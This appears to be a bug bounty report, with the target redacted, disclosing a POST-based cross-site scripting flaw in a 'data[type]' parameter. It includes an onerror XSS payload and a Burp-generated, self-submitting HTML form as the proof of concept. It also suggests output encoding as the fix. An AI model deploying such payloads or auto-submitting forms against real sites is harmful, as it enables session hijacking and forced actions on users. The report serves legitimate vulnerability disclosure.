title: POST XSS -  data[type] parameter
vulnerability_information:
**Description:**
I discovered a Cross-Site Scripting (XSS) vulnerability on ███████ , specifically through the POST method. This vulnerability allows an attacker to inject malicious scripts that could be executed, potentially leading to cookie theft, session hijacking, and other malicious actions.

Vulnerable parameter: data[type]
Payload: <img+src=x+onerror=prompt(1)>

## References

███████

## Impact

Exploitation of this vulnerability can lead to severe consequences, including but not limited:
Session Hijacking: Attackers can steal cookies and impersonate legitimate users.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Use this code in your own website to execute the XSS Method Post.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="████" method="POST">
      <input type="hidden" name="data[account][addedon]" value="2022-11-22 00:51:28" />
      <input type="hidden" name="data[account][confirmcode]" value="ydtgsonuk4xk" />
      <input type="hidden" name="data[account][confirmed]" value="0" />
      <input type="hidden" name="data[account][description]" value="" />
      <input type="hidden" name="data[account][email]" value="testing@example.com" />
      <input type="hidden" name="data[account][externalid]" value="" />
      <input type="hidden" name="data[account][firstname]" value="fnfOzvSR" />
      <input type="hidden" name="data[account][id]" value="4925" />
      <input type="hidden" name="data[account][imagename]" value="" />
      <input type="hidden" name="data[account][integration_id]" value="" />
      <input type="hidden" name="data[account][ispublic]" value="1" />
      <input type="hidden" name="data[account][lastname]" value="fnfOzvSR" />
      <input type="hidden" name="data[account][lastupdate]" value="2025-05-05 04:48:36" />
      <input type="hidden" name="data[account][password]" value="e76fde21f8d373be2038ebd5c2d2e4cf" />
      <input type="hidden" name="data[account][phone]" value="555-666-0606" />
      <input type="hidden" name="data[account][salt]" value="" />
      <input type="hidden" name="data[account][status]" value="1" />
      <input type="hidden" name="data[account][updatedby]" value="0" />
      <input type="hidden" name="data[account][username]" value="testing-mmzhrrdb" />
      <input type="hidden" name="data[type]" value="Register<img src=x onerror=prompt(1)>" />
      <input type="hidden" name="error" value="" />
      <input type="hidden" name="eval" value="" />
      <input type="hidden" name="message" value="Congratulations! Your account has been created! You still need to activate your account before you can log in. Please check your email to activate your account." />
      <input type="hidden" name="redirect" value="" />
      <input type="hidden" name="tracking" value="/thank-you?trackpage=1" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Suggested Mitigation/Remediation Actions
Apply context-dependent encoding and/or validation to user input rendered on a page
